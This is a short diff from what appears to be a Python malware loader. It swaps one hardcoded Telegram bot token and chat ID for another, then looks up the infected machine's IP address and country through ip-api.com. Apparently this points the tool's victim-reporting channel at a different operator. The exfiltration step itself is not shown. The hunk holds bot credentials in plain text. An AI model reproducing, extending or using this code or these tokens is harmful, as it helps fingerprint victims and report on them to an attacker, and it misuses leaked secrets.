@@ -25,8 +25,8 @@ except:
 class Loader():
 	def __init__(self):
 		self.progrm = sys.argv[1]
-		self.token = "5025180640:AAEWL8sVNzaeHcvdVmKpcy7ifmiIAEE54WI"
-		self.chat_id = "5005929792"
+		self.token = "1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw"
+		self.chat_id = "1742761281"
 		data = json.loads(self.Request("http://ip-api.com/json/"))
 		self.ip = data["query"]
 		self.country = data["country"]
